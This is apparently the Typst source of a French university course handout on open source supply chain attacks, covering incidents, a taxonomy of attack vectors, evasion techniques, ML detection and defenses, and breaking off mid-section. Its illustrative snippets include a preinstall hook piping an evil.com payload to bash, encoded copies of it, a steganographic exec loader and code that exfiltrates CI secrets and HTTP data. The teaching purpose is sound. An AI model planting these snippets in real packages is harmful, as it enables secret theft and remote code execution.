// ============================================================
// Polycopié — Cours 7 : Open Source Supply Chain Attacks
// Université de Rennes · IRISA / DiverSE
// Olivier Barais
// ============================================================

#set document(
  title: "Cours 7 — Open Source Supply Chain Attacks",
  author: "Olivier Barais",
  date: datetime(year: 2026, month: 9, day: 1),
)

#set page(
  paper: "a4",
  margin: (top: 2.5cm, bottom: 2.5cm, left: 2.5cm, right: 2.5cm),
  header: context {
    if counter(page).get().first() > 1 [
      #set text(size: 8pt, fill: luma(130))
      #grid(columns: (1fr, 1fr),
        [DevSecOps — Cours 7 · Université de Rennes],
        align(right)[Olivier Barais]
      )
      #line(length: 100%, stroke: 0.5pt + luma(200))
    ]
  },
  footer: context [
    #set text(size: 8pt, fill: luma(130))
    #line(length: 100%, stroke: 0.5pt + luma(200))
    #v(2pt)
    #grid(columns: (1fr, 1fr),
      [IRISA / DiverSE · 2026],
      align(right)[Page #counter(page).display("1")]
    )
  ]
)

#set text(font: "New Computer Modern", size: 10.5pt, lang: "fr")
#set par(justify: true, leading: 0.65em, spacing: 1.2em)
#set heading(numbering: "1.1")

#show heading.where(level: 1): it => {
  v(1.5em)
  block(
    fill: rgb("#1e40af"),
    radius: 4pt,
    inset: (x: 10pt, y: 6pt),
    width: 100%,
    text(fill: white, size: 14pt, weight: "bold")[#it.body]
  )
  v(0.5em)
}

#show heading.where(level: 2): it => {
  v(0.8em)
  text(size: 12pt, weight: "bold", fill: rgb("#1d4ed8"))[#it.body]
  v(0.3em)
}

#show heading.where(level: 3): it => {
  v(0.5em)
  text(size: 11pt, weight: "bold", fill: rgb("#374151"))[#it.body]
  v(0.2em)
}

// Boîte d'alerte
#let alert(color: red, icon: "⚠", body) = block(
  fill: color.lighten(90%),
  stroke: 0.8pt + color,
  radius: 4pt,
  inset: 10pt,
  width: 100%,
)[
  #text(weight: "bold")[#icon  ] #body
]

// Boîte d'exemple
#let example(title, body) = block(
  fill: rgb("#f0f9ff"),
  stroke: (left: 3pt + rgb("#0ea5e9")),
  inset: (left: 12pt, right: 10pt, top: 8pt, bottom: 8pt),
  width: 100%,
)[
  #text(weight: "bold", fill: rgb("#0369a1"))[Exemple — #title] \
  #v(4pt)
  #body
]

// Boîte de définition
#let definition(term, body) = block(
  fill: rgb("#f5f3ff"),
  stroke: (left: 3pt + rgb("#7c3aed")),
  inset: (left: 12pt, right: 10pt, top: 8pt, bottom: 8pt),
  width: 100%,
)[
  #text(weight: "bold", fill: rgb("#6d28d9"))[Définition — #term] \
  #v(4pt)
  #body
]

// Boîte de retenir
#let keypoint(body) = block(
  fill: rgb("#fff7ed"),
  stroke: (left: 3pt + rgb("#ea580c")),
  inset: (left: 12pt, right: 10pt, top: 8pt, bottom: 8pt),
  width: 100%,
)[
  #text(weight: "bold", fill: rgb("#c2410c"))[À retenir] \
  #v(4pt)
  #body
]

// Style des blocs de code
#show raw.where(block: true): it => block(
  fill: rgb("#0f172a"),
  radius: 4pt,
  inset: 10pt,
  width: 100%,
)[#text(fill: rgb("#94a3b8"), size: 9pt, font: "New Computer Modern")[#it]]

// ============================================================
// PAGE DE TITRE
// ============================================================

#align(center)[
  #v(2cm)
  #block(
    fill: rgb("#1e3a8a"),
    radius: 8pt,
    inset: 20pt,
    width: 90%,
  )[
    #text(fill: white, size: 11pt)[DevSecOps — Université de Rennes · IRISA / DiverSE]
    #v(8pt)
    #text(fill: white, size: 20pt, weight: "bold")[Cours 7]
    #v(4pt)
    #text(fill: rgb("#93c5fd"), size: 15pt)[Open Source Supply Chain Attacks]
    #v(4pt)
    #text(fill: rgb("#bfdbfe"), size: 11pt)[Incidents · Taxonomie · Exécution · Évasion · Détection ML · Défenses]
  ]
  #v(1.5cm)
  #text(size: 11pt)[Olivier Barais]
  #v(0.3em)
  #text(size: 10pt, fill: luma(80))[Université de Rennes · IRISA · Équipe DiverSE]
  #v(0.3em)
  #text(size: 10pt, fill: luma(80))[Basé sur les travaux de Ladisa, Plate, Martinez, Barais (SAP Security Research / Université de Rennes)]
  #v(0.3em)
  #text(size: 10pt, fill: luma(80))[2026]
]

#pagebreak()

// ============================================================
// TABLE DES MATIÈRES
// ============================================================

#outline(title: "Table des matières", depth: 2, indent: 1.5em)

#pagebreak()

// ============================================================
// 1. CONTEXTE
// ============================================================

= Contexte : l'open source et les incidents réels

== L'omniprésence de l'open source

Le logiciel libre et open source (FOSS) constitue aujourd'hui 70 à 90 % de tout logiciel moderne, selon le rapport _Census II_ publié conjointement par la Linux Foundation, le Harvard Laboratory for Innovation Science (LISH) et l'OpenSSF @nagle2022census2. Cette dépendance massive crée une surface d'attaque d'une ampleur sans précédent : compromettre un seul composant largement utilisé peut toucher des milliers — voire des millions — d'applications en aval.

Le rapport _State of the Software Supply Chain_ de Sonatype (9e édition, 2023) dresse un constat alarmant : en un an, le nombre de paquets malveillants connus a triplé pour atteindre 245 032 @sonatype2023sssc. L'attaquant n'a plus besoin de pénétrer les systèmes cibles un par un ; il lui suffit d'injecter du code malveillant dans un composant open source pour atteindre simultanément tous ses utilisateurs.

#definition("Attaque supply chain réussie")[
  Une attaque sur la chaîne d'approvisionnement logicielle repose sur trois conditions :
  1. *Spread out* — le malware est accessible aux utilisateurs en aval (publié sur un registre public) ;
  2. *Get used* — les utilisateurs en aval s'appuient sur le code malveillant (dépendance installée) ;
  3. *Get executed* — le code malveillant est finalement exécuté sur les machines cibles.
]

L'ENISA a identifié les attaques sur la supply chain logicielle comme l'une des dix cybermenaces les plus importantes à l'horizon 2030 @enisa2021supply. La CISA américaine, la NSA et l'ODNI ont publié conjointement en 2022 un guide de bonnes pratiques pour les développeurs @cisa2022guidelines.

== Incidents emblématiques

=== event-stream (npm, 2018)

Le paquet `event-stream` comptait 1,5 million de téléchargements par semaine et environ 1 600 paquets dépendants lorsque l'incident s'est produit. Un utilisateur inconnu (`right9control`) a contacté le mainteneur d'origine, Dominic Tarr, lui proposant de « l'aider à maintenir le paquet ». Le transfert de propriété a été accordé @eventstream2018.

Le nouveau mainteneur a ajouté `flatmap-stream` comme dépendance, contenant un payload chiffré qui ne s'exécutait que lors d'un build de _release_ du portefeuille Bitcoin *Copay*. Fait notable : le code malveillant n'était présent que dans le paquet npm publié — pas dans le dépôt git correspondant — rendant la détection particulièrement difficile. L'incident a été découvert par accident grâce à un avertissement sur une commande dépréciée.

#keypoint[
  Un simple transfert de propriété d'un mainteneur suffit à compromettre un paquet téléchargé 1,5 million de fois par semaine. La confiance accordée aux mainteneurs est un vecteur d'attaque à part entière.
]

=== PyTorch-nightly — Dependency Confusion (2022)

PyTorch-nightly distribuait ses dépendances Python depuis un index privé. La dépendance `torchtriton` n'existait que dans cet index privé, non sur PyPI public. L'attaquant a enregistré un paquet `torchtriton` sur PyPI avec un numéro de version volontairement très élevé @pytorch2022dep.

Lorsqu'un développeur exécutait `pip install pytorch-nightly`, pip résolvait `torchtriton` en préférant la version publique la plus haute (index externe prioritaire sur l'index privé), installant ainsi le payload malveillant. Les machines de tous les développeurs ayant installé PyTorch-nightly en décembre 2022 ont été exposées. Cette technique porte le nom de *Dependency Confusion*, popularisée en 2021 par Alex Birsan qui avait démontré sa faisabilité chez Microsoft, Apple, PayPal, Tesla et d'autres @birsan2021confusion, recevant 130 000 USD de #emph[bug bounties].

=== node-ipc / peacenotwar — Protestware (CVE-2022-23812)

L'incident `node-ipc` illustre une menace venue de l'intérieur : le mainteneur lui-même. `node-ipc`, utilisé par Vue CLI, a vu ses versions 10.1.1 et 10.1.2 contenir du code supprimant les fichiers des utilisateurs dont l'adresse IP était géolocalisée en Biélorussie ou en Russie @nodeipc2022. Le code malveillant avait été ajouté dans git puis l'historique effacé.

```javascript
// Extrait de node-ipc/dao/ssl-geospec.js (version 10.1.1)
if (ip && (ip.startsWith('russia') || ip.startsWith('belarus'))) {
  require('peacenotwar')  // → efface récursivement le système de fichiers
}
```

Ce type de comportement, qualifié de *protestware*, soulève des questions fondamentales sur la nature de la confiance dans l'écosystème open source : même un mainteneur légitime peut devenir une menace.

=== XZ Utils / liblzma (CVE-2024-3094, 2024)

L'attaque XZ Utils représente le scénario le plus sophistiqué documenté : une infiltration patiente sur deux ans. Un acteur malveillant opérant sous le pseudonyme « Jia Tan » a contribué légitimement au projet de compression `xz-utils`, construisant progressivement sa réputation jusqu'à devenir co-mainteneur @xzutils2024.

En mars 2024, il a introduit une backdoor dans les versions 5.6.0 et 5.6.1, ciblant exclusivement OpenSSH sur les systèmes x86-64 Linux avec systemd, permettant à un attaquant disposant de la clé privée correspondante de s'authentifier sans mot de passe. La découverte — fortuite — est due à un ingénieur Microsoft qui avait remarqué une latence SSH anormale de 500 ms sur sa machine personnelle.

#alert(color: rgb("#dc2626"), icon: "🔴")[
  XZ Utils illustre l'attaque la plus redoutable : un acteur patient, aux contributions irréprochables pendant deux ans, qui attend d'avoir les droits nécessaires avant d'agir. Aucun outil de détection automatique ne peut anticiper cette menace seul.
]

// ============================================================
// 2. TAXONOMIE
// ============================================================

= Taxonomie des attaques sur la supply chain OSS

== Le SoK de Ladisa et al. (IEEE S&P 2023)

Ladisa, Plate, Martinez et Barais ont publié en 2023 dans le cadre de l'IEEE Symposium on Security and Privacy une étude systématique (#emph[Systematization of Knowledge] — SoK) des attaques sur la supply chain open source @ladisa2023sok. Cette étude repose sur une revue systématique de la littérature (SLR) incorporant des attaques réelles, des preuves de concept (PoC) et des publications académiques. Elle a identifié :

#block(
  fill: rgb("#f8fafc"),
  stroke: 0.5pt + luma(200),
  radius: 4pt,
  inset: 12pt,
  width: 100%,
)[
  #table(
    columns: (auto, 1fr),
    stroke: none,
    fill: (_, row) => if calc.odd(row) { luma(248) } else { white },
    inset: 7pt,
    [*Étendue*], [*Résultat*],
    [Vecteurs d'attaque], [117 vecteurs d'attaque uniques identifiés],
    [Contre-mesures], [+30 safeguards cartographiées et évaluées],
    [Références], [+370 références scientifiques et de littérature grise],
    [Validation], [17 experts en sécurité + 130 développeurs consultés],
  )
]

Le modèle de référence proposé décrit le chemin d'une contribution depuis les *contributeurs/mainteneurs* jusqu'aux *consommateurs finaux*, en passant par le système de gestion de version (GitHub, GitLab…), le système de build (CI/CD), et les registres de distribution (PyPI, npm, Maven Central…). Chacune de ces étapes constitue un point d'attaque potentiel.

Le SAP Risk Explorer @saprisks2023, outil open source interactif compagnon du SoK, permet d'explorer les 117 vecteurs d'attaque, de les filtrer par écosystème ou contre-mesure, et de visualiser les références associées. Il est disponible sur GitHub Pages.

== Les 8 catégories du SoK

#block(
  fill: rgb("#f8fafc"),
  stroke: 0.5pt + luma(200),
  radius: 4pt,
  inset: 10pt,
  width: 100%,
)[
  #table(
    columns: (auto, auto, 1fr),
    stroke: none,
    fill: (_, row) => if calc.odd(row) { luma(248) } else { white },
    inset: 7pt,
    [*ID*], [*Catégorie*], [*Description*],
    [A1], [Source Code], [Injection malveillante dans le code source d'un projet],
    [A2], [Build System], [Compromission des outils ou de l'infrastructure de build],
    [A3], [Dependencies], [Attaque via les mécanismes de gestion des dépendances],
    [A4], [Deployment], [Compromission du pipeline de déploiement ou des artefacts],
    [A5], [Artifact], [Modification des artefacts compilés (binaires, archives)],
    [A6], [Distribution], [Compromission du canal de distribution (registre, CDN)],
    [A7], [Contributor], [Contributeur malveillant prenant le contrôle d'un projet],
    [A8], [Infrastructure], [Compromission de l'infrastructure sous-jacente (DNS, TLS, CI)],
  )
]

== A1 — Attaques sur le code source

La catégorie A1 regroupe les attaques qui introduisent du code malveillant directement dans le dépôt source d'un projet. Plusieurs sous-vecteurs ont été identifiés.

*A1-1 : Injection par un contributeur compromis.* Le compte d'un développeur légitime est pris de contrôle (phishing, credential stuffing), et ses droits de commit sont utilisés pour insérer du code malveillant. L'attaque XZ Utils (Jia Tan) illustre la variante la plus sophistiquée : un acteur qui construit patiemment sa légitimité avant d'agir.

*A1-2 : Hypocrite commits.* Des chercheurs de l'Université du Minnesota ont démontré en 2021 sur le noyau Linux qu'un attaquant pouvait soumettre une correction de bug légitime, puis, quelques semaines plus tard, un « refactoring » supprimant subtilement la validation qui avait été ajoutée. Chaque commit pris isolément semble inoffensif.

*A1-3 : Réintroduction de code supprimé.* L'attaquant identifie une vulnérabilité passée qui a été corrigée et soumet un patch qui la réintroduit sous couvert d'une autre modification.

```c
// Patch initial (accepté comme correction légitime)
void process_data(char *buf, size_t len) {
    if (len > MAX_SIZE) return;  // ← validation ajoutée
    memcpy(dest, buf, len);
}

// "Refactoring" ultérieur (supprime discrètement la validation)
void process_data(char *buf, size_t len) {
    memcpy(dest, buf, len);  // ← MAX_SIZE check "simplifié" = supprimé
}
```

== A3 — Attaques via les dépendances

La catégorie A3 est la plus prolifique en termes d'incidents documentés, car elle n'exige pas la compromission du dépôt cible.

*A3-1 : Typosquatting.* L'attaquant enregistre un paquet dont le nom ressemble à un paquet populaire, en espérant que des développeurs commettent une faute de frappe. Les variations courantes sont : substitution d'un caractère (`requsets`), inversion (`lodhas`), remplacement visuel (`djang0`), pluriel/singulier, ajout d'un tiret.

*A3-2 : Dependency Confusion.* L'attaquant publie sur le registre public un paquet portant le même nom qu'un paquet interne privé d'une organisation, avec un numéro de version plus élevé. Les gestionnaires de paquets qui accordent la priorité aux registres publics installent alors automatiquement le paquet malveillant. Birsan (2021) a démontré cette faille chez plus de 35 entreprises @birsan2021confusion.

```
Organisation : paquet interne @acme/auth-lib (registre privé, v2.1.0)
Attaquant    : publie @acme/auth-lib sur npmjs.com (version 99.0.0)
npm résout   → préfère la version publique la plus haute → payload exécuté
```

*A3-3 : Compromission d'un compte mainteneur.* Si le token npm ou PyPI d'un mainteneur est volé, l'attaquant peut publier une nouvelle version malveillante sous sa signature. La collection Backstabbers' Knife @ohm2020backstabber recense de nombreux incidents de ce type, dont `ua-parser-js` en 2021 @ua2021 (3 versions malveillantes publiées en quelques heures).

*A3-5 : Protestware.* Le mainteneur lui-même rend son paquet malveillant. `colors.js` et `faker.js` (2022) ont été corrompus par leur mainteneur avec des boucles infinies et du texte absurde. `node-ipc` (CVE-2022-23812) @nodeipc2022 a été utilisé pour supprimer des fichiers selon la géolocalisation IP des utilisateurs.

== A4 — Attaques sur le build et le déploiement

*A4-1 : Compromission du serveur de build (SolarWinds).* En 2020, le groupe APT29 a compromis l'infrastructure de build de SolarWinds, injectant du code malveillant lors de la phase de compilation de la plateforme Orion @solarwinds2021. Les binaires produits étaient signés avec le certificat officiel de SolarWinds, les rendant indiscernables d'une distribution légitime. Environ 18 000 organisations ont reçu la mise à jour piégée.

*A4-2 : Cache poisoning.* Les pipelines CI/CD modernes utilisent des caches de dépendances pour accélérer les builds. Si la clé de cache est prédictible ou corruptible, un attaquant ayant accès à l'infrastructure CI peut empoisonner le cache partagé entre plusieurs jobs ou pipelines.

*A4-3 : Scripts de build malveillants.* Les fichiers `Makefile`, `setup.py`, `CMakeLists.txt`, et les scripts `preinstall`/`postinstall` npm s'exécutent automatiquement lors de l'installation ou du build. Ils ont accès à l'environnement CI complet : variables d'environnement, tokens, fichiers de configuration, secrets d'accès cloud.

// ============================================================
// 3. COMMENT LE CODE MALVEILLANT S'EXÉCUTE
// ============================================================

= Comment le code malveillant s'exécute

== Le vecteur d'exécution du gestionnaire de paquets

L'une des conclusions les plus importantes des travaux de recherche sur la supply chain est la suivante : l'installation d'un paquet tiers est sémantiquement équivalente à l'exécution de code arbitraire si ce paquet est malveillant.

```bash
# Ce que fait réellement "pip install maratlib"
pip install maratlib
# → télécharge l'archive
# → exécute setup.py (ou pyproject.toml avec build hooks)
# → le code setup.py s'exécute avec les droits de l'utilisateur courant

# Équivalent conceptuel :
curl https://pypi.org/maratlib/latest/maratlib.tar.gz | tar -x | bash setup.py
```

Cette observation est au cœur de l'article de Ladisa et al. présenté au workshop SCORED'23 @ladisa2022malicious : l'hypothèse de sécurité qui voudrait que « pip installe et c'est tout » est fondamentalement fausse.

== Taxonomie des techniques d'exécution

Ladisa et al. distinguent deux grandes familles de techniques selon le moment où le code malveillant s'exécute.

*Exécution à l'installation (install-time) :*

#block(
  fill: rgb("#f8fafc"),
  stroke: 0.5pt + luma(200),
  radius: 4pt,
  inset: 10pt,
  width: 100%,
)[
  #table(
    columns: (auto, auto, 1fr),
    stroke: none,
    fill: (_, row) => if calc.odd(row) { luma(248) } else { white },
    inset: 7pt,
    [*ID*], [*Mécanisme*], [*Écosystème*],
    [I1], [Hooks `preinstall`/`postinstall` dans `package.json`], [npm (JavaScript), PHP (Composer)],
    [I2], [Code dans `setup.py` ou `pyproject.toml` build hooks], [PyPI (Python), Rust (Cargo build scripts)],
    [I3], [Extension native (`extconf.rb`, `Makefile.PL`)], [RubyGems, Perl CPAN],
  )
]

*Exécution au runtime (import-time et au-delà) :*

#block(
  fill: rgb("#f8fafc"),
  stroke: 0.5pt + luma(200),
  radius: 4pt,
  inset: 10pt,
  width: 100%,
)[
  #table(
    columns: (auto, auto, 1fr),
    stroke: none,
    fill: (_, row) => if calc.odd(row) { luma(248) } else { white },
    inset: 7pt,
    [*ID*], [*Mécanisme*], [*Description*],
    [R1], [Module loader (`__init__.py`, `index.js`)], [S'exécute à l'import, même sans appel explicite],
    [R2], [Méthode courante (`doGet()`, `toString()`)], [Surcharge d'une méthode très fréquemment appelée],
    [R3], [Constructeur d'une classe populaire], [Chaque instanciation déclenche le payload],
    [R4], [Plugin de build (Maven, Gradle)], [S'exécute lors de la compilation du projet consommateur],
  )
]

== I1 — Hooks d'installation npm

Le mécanisme I1 est le plus documenté dans l'écosystème JavaScript. Le fichier `package.json` peut spécifier des scripts `preinstall`, `install` et `postinstall` qui sont exécutés automatiquement par npm lors de l'installation du paquet.

```json
{
  "name": "exemple-malveillant",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "curl http://evil.com/payload | bash",
    "postinstall": "node steal-env.js"
  }
}
```

Le script `steal-env.js` peut lire toutes les variables d'environnement (tokens AWS, tokens GitHub Actions, secrets CI) et les exfiltrer vers un serveur distant. L'exemple réel `browserift-16.2.2` (typosquatting de `browserify`) utilisait ce mécanisme pour ouvrir un reverse shell TCP vers `45.63.54.27:8080`.

== I2 — Code dans setup.py (Python)

En Python, `pip` exécute le fichier `setup.py` (ou les hooks de build définis dans `pyproject.toml`) lors de l'installation. Ce code s'exécute *avant même que le paquet soit importé* par l'application consommatrice.

Le paquet malveillant `maratlib-0.2`, analysé par Ladisa et al. @ladisa2023crosslang, utilisait une obfuscation par renommage d'identifiants combinée à `eval()` pour exécuter un reverse shell à l'installation :

```python
# setup.py de maratlib-0.2 (extrait simplifié)
from setuptools import setup
import os

def l1l_cringe_(l1ll_cringe_):   # déchiffrement de payload
    return eval(l11_cringe_(l1ll_cringe_))

# Payload décodé : os.system("chmod +x /tmp/aza-obf.sh && /tmp/aza-obf.sh")
os.system(l1l_cringe_(b"\x9f\x8b\x0e..."))  # chaîne obfusquée

setup(name='maratlib', version='0.2', packages=[])
```

== Exécution conditionnelle

Une technique sophistiquée consiste à ne déclencher le payload que dans certaines conditions, réduisant ainsi la probabilité de détection lors d'analyses en sandbox :

```python
import os, socket

# S'exécute uniquement dans un environnement de release build
# (CI/CD, pas la machine d'un analyste de sécurité)
if os.getenv('GITHUB_ACTIONS') or os.getenv('CI'):
    hostname = socket.gethostname()
    # exfiltration des secrets CI
    exfiltrate(os.environ, hostname)

# S'exécute uniquement sur certains systèmes d'exploitation
if sys.platform == 'linux':
    install_persistence()
```

// ============================================================
// 4. TECHNIQUES D'ÉVASION
// ============================================================

= Techniques d'évasion

== L'inefficacité des antivirus traditionnels

L'analyse de la collection Backstabbers' Knife @ohm2020backstabber sur VirusTotal @virustotal2023 — 2 884 paquets malveillants connus — révèle un résultat préoccupant : les moteurs antivirus traditionnels sont quasi-inefficaces contre les malwares de supply chain.

#block(
  fill: rgb("#f8fafc"),
  stroke: 0.5pt + luma(200),
  radius: 4pt,
  inset: 10pt,
  width: 100%,
)[
  #table(
    columns: (auto, auto, auto),
    stroke: none,
    fill: (_, row) => if calc.odd(row) { luma(248) } else { white },
    inset: 7pt,
    [*Écosystème*], [*Paquets analysés*], [*Non détectés par AV (VirusTotal)*],
    [npm (JavaScript)], [2 164], [77,1 %],
    [PyPI (Python)], [564], [76,0 %],
    [RubyGems (Ruby)], [156], [60,4 %],
  )
]

La raison principale de cette inefficacité est l'utilisation systématique de techniques d'obfuscation et de transformation de code, spécifiquement conçues pour contourner les moteurs de détection basés sur des signatures statiques.

== Obfuscation des données

Les malwares de supply chain doivent souvent intégrer en dur des URLs de commande et contrôle (C2), des adresses IP, ou des commandes shell. L'obfuscation de ces artefacts est la première ligne de défense de l'attaquant.

*Encodage / décodage à l'exécution :*

```python
import base64, os
# La chaîne "curl http://evil.com/payload | bash" est stockée encodée
cmd = base64.b64decode("Y3VybCBodHRwOi8vZXZpbC5jb20vcGF5bG9hZCB8IGJhc2g=")
os.system(cmd.decode())
```

*Tableau de valeurs ASCII :*

```javascript
// "http://evil.com" représenté en valeurs ASCII
var url = [104,116,116,112,58,47,47,101,118,105,108,46,99,111,109]
           .map(c => String.fromCharCode(c)).join('')
```

*Réordonnancement et concaténation de fragments :* la chaîne malveillante est découpée en sous-chaînes non contiguës stockées dans différentes variables, puis recombinées à l'exécution.

== Transformation statique

La transformation statique modifie l'apparence du code sans en modifier le comportement, rendant l'analyse manuelle et la correspondance de signatures extrêmement difficiles.

*Renommage d'identifiants :* tous les noms de variables, fonctions et classes sont remplacés par des noms illisibles, parfois générés aléatoirement ou conçus pour induire en erreur. Le paquet `maratlib-0.2` utilisait le schéma `l1l_`, `l11l_`, `l1ll_` (combinaisons de `l` minuscule et `1` chiffre, visuellement identiques).

*Insertion de code mort :* des fonctions et branches de code jamais exécutées sont insérées pour augmenter le volume du code et noyer la logique malveillante.

*Dissémination dans les dépendances transitives :* le payload est réparti sur plusieurs niveaux de dépendances. L'audit manuel d'un paquet de niveau 1 ne suffit pas si le malware est dans une dépendance de niveau 3.

== Transformation dynamique

La transformation dynamique modifie le comportement du code *à l'exécution*, après le passage des analyses statiques.

*Stéganographie :*

```python
from PIL import Image
# Le payload est caché dans les bits de poids faible de chaque pixel
img = Image.open('logo.png')  # image d'apparence innocente
pixels = list(img.getdata())
# Reconstruire le payload depuis les LSB
payload = ''.join(chr(p[0] & 0xFF) for p in pixels[:200])
exec(payload)
```

*Monkey Patching (interception à l'exécution) :* le malware remplace une fonction standard (comme `requests.post`) par sa propre version qui effectue l'exfiltration avant de relayer l'appel original. L'application consommatrice fonctionne normalement, mais toutes ses requêtes HTTP sortantes sont copiées vers le serveur de l'attaquant.

```python
import requests
_orig_post = requests.post
def _evil_post(url, **kwargs):
    exfiltrate(kwargs.get('data', ''), kwargs.get('json', ''))
    return _orig_post(url, **kwargs)
requests.post = _evil_post  # substitution silencieuse
```

#alert(color: rgb("#0369a1"), icon: "ℹ")[
  La transformation dynamique est particulièrement difficile à détecter car le code malveillant ne s'exécute que dans le contexte de l'application hôte. Les sandboxes d'analyse qui exécutent le paquet isolément ne voient pas le comportement final.
]

// ============================================================
// 5. DÉTECTION AUTOMATIQUE
// ============================================================

= Détection automatique

== Objectifs des malwares sur la supply chain

L'analyse de la collection Backstabbers' Knife permet d'identifier les objectifs principaux des attaques @ohm2020backstabber. L'*exfiltration de données* domine très largement : entre 54 % et 68 % des paquets malveillants analysés cherchent à voler des credentials, tokens d'API, variables d'environnement, ou fichiers de configuration. Le *dropper* (téléchargement et exécution d'un second payload) représente 29 à 34 % des cas. Les backdoors permanentes, les gains financiers (crypto-mining), et les dénis de service restent minoritaires.

Cette distribution a des implications directes pour la détection : un détecteur efficace doit identifier les comportements d'exfiltration réseau (connexions sortantes suspectes, encodage base64 de variables d'environnement) et les comportements de dropper (téléchargement d'exécutables, appels à `exec` ou `eval` sur du contenu réseau).

== Détection ML cross-langage

Les travaux de Ladisa et al. @ladisa2023crosslang proposent une approche ML originale : entraîner un *modèle unique* capable de détecter des malwares dans plusieurs écosystèmes (npm et PyPI) simultanément, en utilisant des caractéristiques indépendantes du langage de programmation.

L'hypothèse fondamentale est que le comportement malveillant — exfiltration de données, exécution de code arbitraire, obfuscation — présente des signatures structurelles similaires quelle que soit la langue dans laquelle il est écrit.

== Features language-independent

Les caractéristiques sélectionnées par Ladisa et al. sont intentionnellement simples et généralisables :

#block(
  fill: rgb("#f8fafc"),
  stroke: 0.5pt + luma(200),
  radius: 4pt,
  inset: 10pt,
  width: 100%,
)[
  #table(
    columns: (auto, 1fr),
    stroke: none,
    fill: (_, row) => if calc.odd(row) { luma(248) } else { white },
    inset: 7pt,
    [*Catégorie*], [*Features*],
    [Structure], [Usage des hooks d'installation ; nombre de fichiers par extension],
    [Réseau], [Nombre d'URLs, d'adresses IP, de numéros de port],
    [Obfuscation], [Nombre de chaînes base64 ; entropie de Shannon des chaînes et des identifiants],
    [Code], [Ratio de caractères `[`, `=`, `+` par taille de fichier ; présence de `eval`, `exec`, `subprocess`],
    [Tokens suspects], [Présence de patterns `AWS_SECRET`, `GITHUB_TOKEN`, `password`…],
  )
]

Le dataset d'entraînement combine la Backstabbers' Knife Collection @backstabbers2024repo (2 071 paquets JS malveillants, 273 Python malveillants) et des paquets bénins issus des mêmes écosystèmes. Un ratio 90/10 (bénins/malveillants) est utilisé pour refléter le déséquilibre réel.

== Résultats et limites

Les expériences de scan en temps réel de PyPI et npm pendant 10 jours produisent les résultats suivants @ladisa2023crosslang :

#block(
  fill: rgb("#f8fafc"),
  stroke: 0.5pt + luma(200),
  radius: 4pt,
  inset: 10pt,
  width: 100%,
)[
  #table(
    columns: (auto, auto, auto, auto),
    stroke: none,
    fill: (_, row) => if calc.odd(row) { luma(248) } else { white },
    inset: 7pt,
    [*Écosystème*], [*Vrais positifs (TP)*], [*Faux positifs (FP)*], [*Précision*],
    [npm], [38], [1 083], [~3,4 %],
    [PyPI], [17], [453], [~3,6 %],
  )
]

Le modèle cross-langage détecte *autant* que les modèles mono-langage tout en étant plus général, confirmant l'hypothèse de transferabilité des features. Cependant, le taux de faux positifs reste le défi principal : de nombreux petits paquets légitimes présentent des caractéristiques similaires aux malwares (entropie élevée, URLs intégrées, hooks d'installation).

#keypoint[
  La détection ML de malwares supply chain est prometteuse mais ne peut pas être le seul mécanisme de défense. Les faux positifs ont un coût humain réel (revue manuelle) et un faux négatif (malware non détecté) a des conséquences potentiellement graves.
]

// ============================================================
// 6. ANALYSE DES RISQUES ET DÉFENSES
// ============================================================

= Analyse des risques et défenses

== Évaluation de la surface d'attaque d'une dépendance

Avant d'adopter une dépendance open source, il est essentiel d'évaluer sa surface d'attaque. Plusieurs facteurs de risque ont été identifiés dans la littérature et les frameworks de bonnes pratiques :

#block(
  fill: rgb("#f8fafc"),
  stroke: 0.5pt + luma(200),
  radius: 4pt,
  inset: 10pt,
  width: 100%,
)[
  #table(
    columns: (auto, auto, auto),
    stroke: none,
    fill: (_, row) => if calc.odd(row) { luma(248) } else { white },
    inset: 7pt,
    [*Facteur*], [*Risque faible*], [*Risque élevé*],
    [Nombre de mainteneurs actifs], [> 5, avec rotation], [1 seul mainteneur],
    [Gouvernance], [Fondation (Linux, Apache, CNCF)], [Individu non institutionnel],
    [Fréquence de contribution], [Commits réguliers récents], [Abandonné depuis > 1 an],
    [Tests automatisés], [Couverture > 80 %], [Peu ou pas de tests],
    [Revue de code], [PR obligatoire, 2+ reviewers], [Merge direct sur main],
    [Âge et stabilité], [> 5 ans, versioning sémantique], [Projet récent < 6 mois],
    [Transparence], [Build reproductible, SBOM publié], [Build opaque, pas de provenance],
  )
]

== OpenSSF Scorecard

L'OpenSSF Scorecard @openssf_scorecard automatise l'évaluation de la posture de sécurité d'un projet open source hébergé sur GitHub. Il produit un score sur 10 basé sur une vingtaine de vérifications :

```bash
# Installation et usage
go install github.com/ossf/scorecard/v4/cmd/scorecard@latest
scorecard --repo=github.com/my-org/my-project --format json | jq .

# Checks évalués (extrait) :
# Branch-Protection       : CODEOWNERS, protection de main
# CI-Tests                : tests automatiques sur les PR
# Code-Review             : revue requise avant merge
# Dependency-Update-Tool  : Dependabot ou Renovate actif
# Fuzzing                 : fuzzing continu (OSS-Fuzz)
# Maintained              : activité récente
# Signed-Releases         : artefacts signés cryptographiquement
# Token-Permissions       : permissions minimales dans GitHub Actions
# Vulnerabilities         : CVE connues non corrigées
```

== deps.dev (Google)

Le service Open Source Insights de Google @depsdev2021, accessible sur [deps.dev](https://deps.dev/), fournit pour chaque paquet de tout écosystème majeur : le graphe de dépendances transitif complet, le score OpenSSF Scorecard, les CVE connues, les informations de licence, et les statistiques d'utilisation.

Son API REST permet l'intégration dans les pipelines CI/CD :

```bash
# Vérifier les informations de sécurité d'une version précise
curl "https://api.deps.dev/v3/systems/pypi/packages/requests/versions/2.31.0"

# Résultat : licenses, CVEs, dépendances, advisories, scorecard
```

== Framework MITRE ATT&CK — Supply Chain

Le framework MITRE ATT&CK @mitreattack_t1195 catalogue les techniques d'attaque supply chain dans la tactique T1195. Les trois sous-techniques principales sont :

#block(
  fill: rgb("#f8fafc"),
  stroke: 0.5pt + luma(200),
  radius: 4pt,
  inset: 10pt,
  width: 100%,
)[
  #table(
    columns: (auto, 1fr, 1fr),
    stroke: none,
    fill: (_, row) => if calc.odd(row) { luma(248) } else { white },
    inset: 7pt,
    [*ID*], [*Sous-technique*], [*Exemple*],
    [T1195.001], [Compromise Software Supply Chain (Build System)], [SolarWinds / SUNBURST],
    [T1195.002], [Compromise Software Supply Chain (Software Distribution)], [event-stream, ua-parser-js],
    [T1195.003], [Compromise Software Supply Chain (Software Dependency)], [Dependency Confusion, typosquatting],
  )
]

== Défenses par couche

Une défense efficace contre les attaques supply chain est multi-couches. Le tableau suivant synthétise les contre-mesures recommandées à chaque étape du pipeline @cisa2022guidelines :

#block(
